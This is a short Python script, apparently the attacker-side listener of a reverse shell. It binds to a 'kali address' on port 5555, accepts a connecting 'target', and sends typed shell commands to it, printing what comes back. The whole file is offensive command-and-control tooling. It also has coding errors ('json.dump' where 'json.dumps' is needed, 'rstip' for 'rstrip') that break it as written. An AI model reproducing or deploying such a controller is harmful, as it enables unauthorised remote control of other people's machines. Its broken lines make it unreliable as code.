import socket
import json
import os

def reliable_send(data):
    jsondata = json.dump(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstip()
            return json.loads(data)
        except ValueError:
            continue

def target_communication(ip):
    while True:
        command = input(f'* Shell~{str(ip)}: ')
        reliable_send(command)
        if command == "quit":
            break
        elif command == "clear":
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        else:
            result = reliable_recv()
            print(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
kali_addr = str(input('Insert your kali address:\n'))
s.bind((kali_addr, 5555))
print('[+] Listening Connections')
s.listen(5)
target, ip = s.accept()
print(f'[+] Target Connected: {str(ip)}')
target_communication(ip)